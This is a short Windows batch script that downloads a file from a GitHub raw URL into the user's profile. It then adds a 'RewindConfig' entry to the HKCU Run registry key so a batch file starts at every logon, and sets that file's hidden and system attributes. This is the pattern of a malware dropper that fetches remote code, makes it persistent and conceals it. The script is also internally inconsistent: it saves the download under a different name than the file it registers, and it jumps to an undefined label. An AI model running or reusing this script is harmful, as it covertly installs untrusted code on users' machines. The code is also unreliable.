@echo off


:rewind_1
IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
	goto rewind_2
) ELSE (
	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
	goto rewind_2
)

